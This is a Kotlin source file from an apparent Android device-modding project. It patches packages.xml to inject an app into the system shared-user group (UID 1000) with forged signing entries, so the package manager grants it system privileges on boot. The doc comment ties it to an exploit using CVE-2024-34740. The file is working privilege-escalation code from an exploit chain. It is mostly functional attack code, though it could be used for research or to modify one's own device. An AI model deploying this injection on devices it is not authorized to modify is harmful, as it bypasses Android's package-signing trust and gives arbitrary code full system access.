package com.penumbraos.systeminjector.common

import org.w3c.dom.Document
import org.w3c.dom.Element
import org.w3c.dom.NodeList
import java.io.ByteArrayOutputStream
import javax.xml.parsers.DocumentBuilderFactory
import javax.xml.transform.TransformerFactory
import javax.xml.transform.dom.DOMSource
import javax.xml.transform.stream.StreamResult
import javax.xml.xpath.XPathConstants
import javax.xml.xpath.XPathFactory
import kotlin.math.max

/**
 * Patches a packages.xml DOM to inject a new package entry into the
 * android.uid.system shared user group.
 *
 * This is the core mechanism: PMS on boot reads packages.xml (or
 * packages-backup.xml if present) and trusts whatever is in it.
 * By injecting a <package> element with matching signing info into
 * the <shared-user userId="1000"> group, PMS will grant the app
 * system UID privileges.
 *
 * Shared between the exploit (bootstrap via CVE-2024-34740) and the
 * installer (ongoing installs via direct file access as UID 1000).
 */
object PackagesXmlPatcher {

    /**
     * Insert a new package into the packages.xml DOM.
     *
     * Performs the following mutations on [document]:
     * 1. Allocates new keyset and key IDs (increments lastIssuedKeySetId / lastIssuedKeyId)
     * 2. Inserts a <public-key> element under /packages/keyset-settings/keys
     * 3. Inserts a <keyset> element under /packages/keyset-settings/keysets
     * 4. Finds next available cert index
     * 5. Inserts a <package> element (before first <shared-user>)
     * 6. Replaces <pastSigs> under <shared-user userId="[sharedUserId]"><sigs>
     *
     * @param document The parsed packages.xml DOM (mutable, modified in-place)
     * @param packageName The package name to inject (e.g. "com.penumbraos.systeminjector")
     * @param codePath The APK directory path (e.g. "/data/app/com.penumbraos.systeminjector-injected")
     * @param sharedUserId The numeric shared user ID (1000 for system)
     */
    fun insertPackage(
        document: Document,
        packageName: String,
        codePath: String,
        sharedUserId: Int
    ) {
        val xPath = XPathFactory.newInstance().newXPath()

        // Check for dupes
        val existingPkg = xPath.compile("/packages/package[@name='$packageName']")
            .evaluate(document, XPathConstants.NODE) as? Element
        if (existingPkg != null) {
            throw IllegalStateException(
                "Package '$packageName' already exists in packages.xml. It must be uninstalled before re-injection."
            )
        }

        // Allocate keyset identifiers
        val lastIssuedKeySetId = xPath.compile("/packages/keyset-settings/lastIssuedKeySetId")
            .evaluate(document, XPathConstants.NODE) as Element
        val lastIssuedKeyId = xPath.compile("/packages/keyset-settings/lastIssuedKeyId")
            .evaluate(document, XPathConstants.NODE) as Element
        val newKeySetId = lastIssuedKeySetId.getAttribute("value").toInt() + 1
        val newKeyId = lastIssuedKeyId.getAttribute("value").toInt() + 1
        lastIssuedKeySetId.setAttribute("value", newKeySetId.toString())
        lastIssuedKeyId.setAttribute("value", newKeyId.toString())

        // Insert <public-key> for the new package
        val publicKey = document.createElement("public-key").apply {
            setAttribute("identifier", newKeyId.toString())
            setAttribute("value", SigningConstants.TARGET_KEY_BASE64)
        }
        (xPath.compile("/packages/keyset-settings/keys")
            .evaluate(document, XPathConstants.NODE) as Element).appendChild(publicKey)

        // Insert <keyset> for the new package
        val keyset = document.createElement("keyset").apply {
            setAttribute("identifier", newKeySetId.toString())
            appendChild(
                document.createElement("key-id").apply {
                    setAttribute("identifier", newKeyId.toString())
                }
            )
        }
        (xPath.compile("/packages/keyset-settings/keysets")
            .evaluate(document, XPathConstants.NODE) as Element).appendChild(keyset)

        // Find next available cert index
        var newCertIndex = 0
        val certs = xPath.compile("/packages/package//cert[@index][@key]")
            .evaluate(document, XPathConstants.NODESET) as NodeList
        for (i in 0 until certs.length) {
            val certIndex = (certs.item(i) as Element).getAttribute("index").toInt()
            newCertIndex = max(newCertIndex, certIndex + 1)
        }

        // Insert <package> element (before first <shared-user>)
        val packageElem = document.createElement("package").apply {
            setAttribute("name", packageName)
            setAttribute("codePath", codePath)
            setAttribute("sharedUserId", sharedUserId.toString())
            setAttribute("publicFlags", "0")
            appendChild(
                document.createElement("sigs").apply {
                    setAttribute("count", "1")
                    setAttribute("schemeVersion", "2")
                    appendChild(
                        document.createElement("cert").apply {
                            setAttribute("index", newCertIndex.toString())
                            setAttribute("key", SigningConstants.TARGET_CERT_HEX)
                        }
                    )
                }
            )
        }

        val firstSharedUser = xPath.compile("/packages/shared-user")
            .evaluate(document, XPathConstants.NODE) as Element
        firstSharedUser.parentNode.insertBefore(packageElem, firstSharedUser)

        // Insert <pastSigs> into <shared-user userId="$sharedUserId"><sigs>
        val sharedUserSigs = xPath
            .compile("/packages/shared-user[@userId=\"$sharedUserId\"]/sigs")
            .evaluate(document, XPathConstants.NODE) as Element

        // Delete any existing <pastSigs>
        while (true) {
            val childNodes = sharedUserSigs.childNodes
            var found = false
            for (i in 0 until childNodes.length) {
                val item = childNodes.item(i)
                if (item is Element && item.nodeName == "pastSigs") {
                    sharedUserSigs.removeChild(item)
                    found = true
                    break
                }
            }
            if (!found) break
        }

        // Insert new <pastSigs>
        sharedUserSigs.appendChild(
            document.createElement("pastSigs").apply {
                setAttribute("count", "2")
                setAttribute("schemeVersion", "3")
                for (i in 0..1) {
                    appendChild(
                        document.createElement("cert").apply {
                            setAttribute("index", newCertIndex.toString())
                            setAttribute("flags", "2")
                        }
                    )
                }
            }
        )
    }

    /**
     * Serialize a packages.xml DOM to bytes and validate the output.
     *
     * Safety: This is the validation gate that prevents writing corrupt data.
     * Every code path that writes packages-backup.xml MUST go through this.
     *
     * Checks:
     * - Output is > 100 bytes (catches empty/truncated serialization)
     * - Output re-parses as valid XML
     * - Root element is <packages> (catches wrong document or mangled structure)
     *
     * @param document The DOM to serialize
     * @return The serialized XML bytes, ready to write to packages-backup.xml
     * @throws IllegalStateException if any validation check fails
     */
    fun serializeAndValidate(document: Document): ByteArray {
        val baos = ByteArrayOutputStream()
        TransformerFactory.newInstance().newTransformer()
            .transform(DOMSource(document), StreamResult(baos))

        val outputBytes = baos.toByteArray()
        check(outputBytes.size > 100) {
            "Serialized packages XML is suspiciously small (${outputBytes.size} bytes)"
        }
        val verifyDoc = DocumentBuilderFactory.newInstance().newDocumentBuilder()
            .parse(outputBytes.inputStream())
        check(verifyDoc.documentElement.nodeName == "packages") {
            "Serialized XML root element is '${verifyDoc.documentElement.nodeName}', expected 'packages'"
        }

        return outputBytes
    }
}
